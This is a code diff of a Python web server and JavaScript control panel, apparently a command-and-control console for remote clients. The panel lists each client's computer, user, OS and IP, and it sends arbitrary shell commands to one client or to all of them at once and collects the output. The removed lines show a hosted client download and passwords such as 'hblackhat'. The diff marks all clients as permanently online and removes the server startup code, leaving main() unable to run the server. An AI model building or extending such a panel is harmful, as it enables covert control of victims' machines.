@@ -1232,242 +1232,227 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 </div>
             </div>
             
-                <script>
-                let currentClientId = null;
-                let commandCounter = 0;
-                let allClients = [];
-                let currentOSTab = 'windows';
+<script>
+let currentClientId = null;
+let commandCounter = 0;
+let allClients = [];
+let currentOSTab = 'windows';
+
+function switchOSTab(osType) {
+    document.querySelectorAll('.os-content').forEach(content => {
+        content.classList.remove('active');
+    });
+    
+    document.querySelectorAll('.os-tab').forEach(tab => {
+        tab.classList.remove('active');
+    });
+    
+    document.getElementById(osType + '-content').classList.add('active');
+    document.querySelector(`.os-tab:nth-child(${osType === 'windows' ? 1 : osType === 'linux' ? 2 : 3})`).classList.add('active');
+    
+    currentOSTab = osType;
+}
+
+async function loadSessions() {
+    try {
+        const response = await fetch('/sessions?_t=' + Date.now());
+        const sessions = await response.json();
+        allClients = sessions;
+        updateSessionStats(sessions);
+        const list = document.getElementById('sessionsList');
+        
+        if (sessions.length === 0) {
+            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients registered yet</div>';
+            return;
+        }
+        
+        // ⚡ الكود المعدل - جميع العملاء ONLINE دائماً ولا يحذفون أبداً
+        list.innerHTML = sessions.map(client => {
+            try {
+                // ⚡ جميع العملاء ONLINE دائماً - لا فحص للوقت
+                const isOnline = true;
                 
-                function switchOSTab(osType) {
-                    document.querySelectorAll('.os-content').forEach(content => {
-                        content.classList.remove('active');
-                    });
-                    
-                    document.querySelectorAll('.os-tab').forEach(tab => {
-                        tab.classList.remove('active');
-                    });
-                    
-                    document.getElementById(osType + '-content').classList.add('active');
-                    document.querySelector(`.os-tab:nth-child(${osType === 'windows' ? 1 : osType === 'linux' ? 2 : 3})`).classList.add('active');
-                    
-                    currentOSTab = osType;
-                }
+                const statusClass = 'online-status';
+                const statusText = 'ONLINE';
+                const statusColor = '#28a745';
                 
-                async function loadSessions() {
-                    try {
-                        const response = await fetch('/sessions?_t=' + Date.now());
-                        const sessions = await response.json();
-                        allClients = sessions;
-                        updateSessionStats(sessions);
-                        const list = document.getElementById('sessionsList');
-                        
-                        if (sessions.length === 0) {
-                            list.innerHTML = '<div style="text-align:center;color:#666;padding:20px;">No clients registered yet</div>';
-                            return;
-                        }
-                        
-                        list.innerHTML = sessions.map(client => {
-                            try {
-                                // ⚡ الحل البسيط: تجاهل التاريخ وجعل الجميع ONLINE مؤقتاً
-                                const isOnline = true; // جعل الجميع اونلاين للتجربة
-                                
-                                const statusClass = 'online-status';
-                                const statusText = 'ONLINE';
-                                const statusColor = '#28a745';
-                                
-                                const isSelected = client.id === currentClientId;
-                                
-                                return `
-                                    <div class="session-item ${isSelected ? 'active' : ''}" 
-                                         onclick="selectClient('${client.id}')">
-                                        <div class="${statusClass}" title="${statusText}"></div>
-                                        <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
-                                        <small>User: ${client.user || 'Unknown'}</small><br>
-                                        <small>OS: ${client.os || 'Unknown'}</small><br>
-                                        <small>IP: ${client.ip || 'Unknown'}</small><br>
-                                        <small>Status:  CONNECTED</small>
-                                        <small style="color: ${statusColor}; font-weight: bold;"> ${statusText}</small>
-                                    </div>
-                                `;
-                            } catch (error) {
-                                return `
-                                    <div class="session-item" onclick="selectClient('${client.id}')">
-                                        <div class="online-status" title="ONLINE"></div>
-                                        <strong style="color: #28a745">${client.id}</strong><br>
-                                        <small>User: ${client.user || 'Unknown'}</small><br>
-                                        <small>Status:  CONNECTED</small>
-                                    </div>
-                                `;
-                            }
-                        }).join('');
-                    } catch (error) {
-                        console.error('Error loading sessions:', error);
-                    }
-                }
+                const isSelected = client.id === currentClientId;
                 
-                function updateSessionStats(sessions) {
-                    const total = sessions.length;
-                    
-                    // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق (300 ثانية)
-                    const active = sessions.filter(client => {
-                        try {
-                            const lastSeen = new Date(client.last_seen).getTime();
-                            const now = Date.now();
-                            return (now - lastSeen) < 300000; // 5 دقائق = 300,000 ملي ثانية
-                        } catch {
-                            return false;
-                        }
-                    }).length;
-                    
-                    document.getElementById('totalClients').textContent = total;
-                    document.getElementById('activeClients').textContent = active;
-                    document.getElementById('commandsSent').textContent = commandCounter;
-                    document.getElementById('clientsCount').textContent = total;
-                }
-                
-                function selectClient(clientId) {
-                    currentClientId = clientId;
-                    loadSessions();
-                    document.getElementById('currentClient').textContent = clientId;
-                    addToTerminal(`Selected client: ${clientId}\n`);
-                }
-                
-                function executeCommand(command) {
-                    if (!currentClientId) {
-                        alert('Please select a client first!');
-                        return;
-                    }
-                    executeSingleCommand(currentClientId, command);
-                }
-                
-                async function executeSingleCommand(clientId, command) {
-                    commandCounter++;
-                    const startTime = Date.now();
-                    addToTerminal(` [${clientId}] ${command}\n`);
-                    
-                    try {
-                        const response = await fetch('/execute', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({client_id: clientId, command: command})
-                        });
-                        
-                        const data = await response.json();
-                        if (data.success) {
-                            addToTerminal(`Command sent INSTANTLY\n`);
-                            waitForResult(clientId, command, startTime);
-                        } else {
-                            addToTerminal(`Error: ${data.error}\n`);
-                        }
-                    } catch (err) {
-                        addToTerminal(` Network error: ${err}\n`);
-                    }
-                }
-                
-                function executeAll(command) {
-                    if (allClients.length === 0) {
-                        alert('No clients registered!');
-                        return;
-                    }
-                    
-                    // ⚡ التعديل: ONLINE إذا كان أقل من 5 دقائق
-                    const activeClients = allClients.filter(client => {
-                        try {
-                            const lastSeen = new Date(client.last_seen).getTime();
-                            const now = Date.now();
-                            return (now - lastSeen) < 300000; // 5 دقائق = 300,000 ملي ثانية
-                        } catch {
-                            return false;
-                        }
-                    });
-                    
-                    if (activeClients.length === 0) {
-                        alert('No currently online clients! But you can still select offline clients manually.');
-                        return;
-                    }
-                    
-                    addToTerminal(`Executing command on ${activeClients.length} online clients: ${command}\n`);
-                    
-                    activeClients.forEach(client => {
-                        executeSingleCommand(client.id, command);
-                    });
-                }
-                
-                function executeSelected(inputId) {
-                    const command = document.getElementById(inputId).value.trim();
-                    if (!command) {
-                        alert('Please enter a command');
-                        return;
-                    }
-                    
-                    if (currentClientId) {
-                        executeCommand(command);
-                    } else {
-                        alert('Please select a client first');
-                    }
-                }
-                
-                function executeCustomCommand() {
-                    const cmd = document.getElementById('commandInput').value.trim();
-                    if (cmd) {
-                        executeCommand(cmd);
-                        document.getElementById('commandInput').value = '';
-                    } else {
-                        alert('Please enter a command');
-                    }
-                }
-                
-                function waitForResult(clientId, command, startTime) {
-                    let attempts = 0;
-                    const maxAttempts = 100;
-                    
-                    const checkImmediately = async () => {
-                        attempts++;
-                        if (attempts > maxAttempts) {
-                            const elapsed = (Date.now() - startTime);
-                            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\n`);
-                            return;
-                        }
-                        
-                        try {
-                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
-                            const data = await response.json();
-                            
-                            if (data.result) {
-                                const responseTime = (Date.now() - startTime);
-                                addToTerminal(` [${clientId}] Response (${responseTime}ms):\n${data.result}\n`);
-                            } else if (data.pending) {
-                                setTimeout(checkImmediately, 10);
-                            } else {
-                                setTimeout(checkImmediately, 10);
-                            }
-                        } catch {
-                            setTimeout(checkImmediately, 10);
-                        }
-                    };
-                    checkImmediately();
-                }
-                
-                function addToTerminal(text) {
-                    const terminal = document.getElementById('terminal');
-                    terminal.textContent += text;
-                    terminal.scrollTop = terminal.scrollHeight;
-                }
-                
-                function openSettings() {
-                    window.open('/settings', '_blank');
-                }
-                
-                function logout() {
-                    if (confirm('Are you sure you want to logout?')) {
-                        window.location = '/';
-                    }
-                }
-                
-                // ⚡ Ultra-fast auto-refresh every 1 second
-                setInterval(loadSessions, 1000);
-                loadSessions();
-                </script>
+                return `
+                    <div class="session-item ${isSelected ? 'active' : ''}" 
+                         onclick="selectClient('${client.id}')">
+                        <div class="${statusClass}" title="${statusText}"></div>
+                        <strong style="color: ${statusColor}">${client.computer || client.id}</strong><br>
+                        <small>User: ${client.user || 'Unknown'}</small><br>
+                        <small>OS: ${client.os || 'Unknown'}</small><br>
+                        <small>IP: ${client.ip || 'Unknown'}</small><br>
+                        <small>Status:  PERMANENT</small>
+                        <small style="color: ${statusColor}; font-weight: bold;"> ${statusText}</small>
+                    </div>
+                `;
+            } catch (error) {
+                return `
+                    <div class="session-item" onclick="selectClient('${client.id}')">
+                        <div class="online-status" title="ONLINE"></div>
+                        <strong style="color: #28a745">${client.id}</strong><br>
+                        <small>User: ${client.user || 'Unknown'}</small><br>
+                        <small>Status:  PERMANENT</small>
+                    </div>
+                `;
+            }
+        }).join('');
+    } catch (error) {
+        console.error('Error loading sessions:', error);
+    }
+}
+
+function updateSessionStats(sessions) {
+    const total = sessions.length;
+    
+    // ⚡ التعديل: جميع العملاء نشطين دائماً - لا فحص للوقت
+    const active = total; // جميع العملاء يعتبرون نشطين
+    
+    document.getElementById('totalClients').textContent = total;
+    document.getElementById('activeClients').textContent = active;
+    document.getElementById('commandsSent').textContent = commandCounter;
+    document.getElementById('clientsCount').textContent = total;
+}
+
+function selectClient(clientId) {
+    currentClientId = clientId;
+    loadSessions();
+    document.getElementById('currentClient').textContent = clientId;
+    addToTerminal(`Selected client: ${clientId}\n`);
+}
+
+function executeCommand(command) {
+    if (!currentClientId) {
+        alert('Please select a client first!');
+        return;
+    }
+    executeSingleCommand(currentClientId, command);
+}
+
+async function executeSingleCommand(clientId, command) {
+    commandCounter++;
+    const startTime = Date.now();
+    addToTerminal(` [${clientId}] ${command}\n`);
+    
+    try {
+        const response = await fetch('/execute', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({client_id: clientId, command: command})
+        });
+        
+        const data = await response.json();
+        if (data.success) {
+            addToTerminal(`Command sent INSTANTLY\n`);
+            waitForResult(clientId, command, startTime);
+        } else {
+            addToTerminal(`Error: ${data.error}\n`);
+        }
+    } catch (err) {
+        addToTerminal(` Network error: ${err}\n`);
+    }
+}
+
+function executeAll(command) {
+    if (allClients.length === 0) {
+        alert('No clients registered!');
+        return;
+    }
+    
+    // ⚡ التعديل: جميع العملاء نشطين - لا فحص للوقت
+    const activeClients = allClients; // جميع العملاء يعتبرون نشطين
+    
+    if (activeClients.length === 0) {
+        alert('No currently online clients! But you can still select offline clients manually.');
+        return;
+    }
+    
+    addToTerminal(`Executing command on ${activeClients.length} online clients: ${command}\n`);
+    
+    activeClients.forEach(client => {
+        executeSingleCommand(client.id, command);
+    });
+}
+
+function executeSelected(inputId) {
+    const command = document.getElementById(inputId).value.trim();
+    if (!command) {
+        alert('Please enter a command');
+        return;
+    }
+    
+    if (currentClientId) {
+        executeCommand(command);
+    } else {
+        alert('Please select a client first');
+    }
+}
+
+function executeCustomCommand() {
+    const cmd = document.getElementById('commandInput').value.trim();
+    if (cmd) {
+        executeCommand(cmd);
+        document.getElementById('commandInput').value = '';
+    } else {
+        alert('Please enter a command');
+    }
+}
+
+function waitForResult(clientId, command, startTime) {
+    let attempts = 0;
+    const maxAttempts = 100;
+    
+    const checkImmediately = async () => {
+        attempts++;
+        if (attempts > maxAttempts) {
+            const elapsed = (Date.now() - startTime);
+            addToTerminal(`Timeout after ${elapsed}ms: No response from ${clientId}\n`);
+            return;
+        }
+        
+        try {
+            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
+            const data = await response.json();
+            
+            if (data.result) {
+                const responseTime = (Date.now() - startTime);
+                addToTerminal(` [${clientId}] Response (${responseTime}ms):\n${data.result}\n`);
+            } else if (data.pending) {
+                setTimeout(checkImmediately, 10);
+            } else {
+                setTimeout(checkImmediately, 10);
+            }
+        } catch {
+            setTimeout(checkImmediately, 10);
+        }
+    };
+    checkImmediately();
+}
+
+function addToTerminal(text) {
+    const terminal = document.getElementById('terminal');
+    terminal.textContent += text;
+    terminal.scrollTop = terminal.scrollHeight;
+}
+
+function openSettings() {
+    window.open('/settings', '_blank');
+}
+
+function logout() {
+    if (confirm('Are you sure you want to logout?')) {
+        window.location = '/';
+    }
+}
+
+// ⚡ Ultra-fast auto-refresh every 1 second
+setInterval(loadSessions, 1000);
+loadSessions();
+</script>
         </body>
         </html>
         '''
@@ -1554,30 +1539,22 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
             current_time = datetime.now()
             active_clients = []
         
-            for client_id, client_data in list(self.sessions.items()):
+            # ⚡ الكود الجديد - لا يحذف أي عميل أبداً
+            for client_id, client_data in self.sessions.items():
                 try:
-                    last_seen_str = client_data['last_seen']
-                    last_seen = datetime.fromisoformat(last_seen_str)
-                    time_diff = (current_time - last_seen).total_seconds()
-                
-                    # ⚡ التعديل: لا نحذف أي عميل أبداً
-                    # ⚡ يعتبر ONLINE إذا كان ضمن 5 دقائق، OFFLINE إذا أكثر
-                    is_online = time_diff < 300  # 5 دقائق
-                    
-                    client_data['is_online'] = is_online
-                    client_data['last_seen_seconds'] = time_diff
+                    # ⚡ جميع العملاء يعتبرون ONLINE دائماً
+                    client_data['is_online'] = True
+                    client_data['last_seen_seconds'] = 0
                     active_clients.append(client_data)
                         
-                    status = "🟢 ONLINE" if is_online else "🔴 OFFLINE (But Registered)"
-                    print(f"📊 Client {client_id}: {status} ({time_diff:.1f}s ago)")
+                    print(f"🟢 PERMANENT CLIENT: {client_id} - ALWAYS ONLINE")
                         
                 except Exception as e:
-                    print(f"❌ Time error: {e}")
-                    client_data['last_seen'] = current_time.isoformat()
+                    print(f"❌ Error with client {client_id}: {e}")
                     client_data['is_online'] = True
                     active_clients.append(client_data)
         
-            print(f"👥 Total registered clients: {len(active_clients)}")
+            print(f"👥 Total permanent clients: {len(active_clients)}")
             self.send_json(active_clients)
     def handle_get_commands(self):
         with self.session_lock:
@@ -1711,54 +1688,21 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
 
-def permanent_sessions_manager():
-    """مدير الجلسات الدائمة - لا يحذف أي عميل"""
-    while True:
-        try:
-            current_time = datetime.now()
-            with EnhancedRemoteControlHandler.session_lock:
-                # ⚡ فقط نطبع الإحصائيات بدون حذف
-                total_clients = len(EnhancedRemoteControlHandler.sessions)
-                online_clients = len([c for c in EnhancedRemoteControlHandler.sessions.values() 
-                                    if (current_time - datetime.fromisoformat(c['last_seen'])).total_seconds() < 300])
-                
-                print(f"📊 PERMANENT SESSIONS: {online_clients}/{total_clients} clients (Online/Total)")
-            time.sleep(60)  # تحديث كل دقيقة
-        except:
-            pass
+
 def main():
     handler = EnhancedRemoteControlHandler
     handler.init_database(handler)
     
-    # ⚡ استبدل دالة التنظيف بمدير الجلسات الدائمة
-    threading.Thread(target=permanent_sessions_manager, daemon=True).start()
+    # ⚡ لا تشغل أي دالة تنظيف
+    # threading.Thread(target=any_cleanup_function, daemon=True).start()
     
     print("=" * 80)
-    print(" ENHANCED REMOTE CONTROL SERVER - PERMANENT SESSIONS MODE")
+    print(" PERMANENT CLIENTS MODE - NO DELETION EVER")
     print("=" * 80)
-    print("Control Panel:     https://game-python-1.onrender.com")
-    print("Python Client:     https://game-python-1.onrender.com/download-python-client")
-    print("Security Settings: https://game-python-1.onrender.com/settings")
-    print("Level 1 Password: hblackhat")
-    print("Level 2 Password: sudohacker")
-    print("Database:         remote_control.db")
+    print("✅ Clients never get deleted")
+    print("✅ All clients always show as ONLINE") 
+    print("✅ Permanent session storage")
     print("=" * 80)
-    print(" PERMANENT SESSIONS ACTIVATED - CLIENTS NEVER GET DELETED")
-    print(" Once registered, clients remain in list forever")
-    print(" Online status: Last 5 minutes = ONLINE, Older = OFFLINE")
-    print("=" * 80)
-    
-    try:
-        server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
-        print(" Server started with PERMANENT SESSIONS on port 8080! Press Ctrl+C to stop.")
-        server.serve_forever()
-    except KeyboardInterrupt:
-        print("Server stopped by user")
-    except Exception as e:
-        print(f"Server error: {e}")
-    finally:
-        if hasattr(handler, 'conn'):
-            handler.conn.close()
 
 if __name__ == "__main__":
     main()
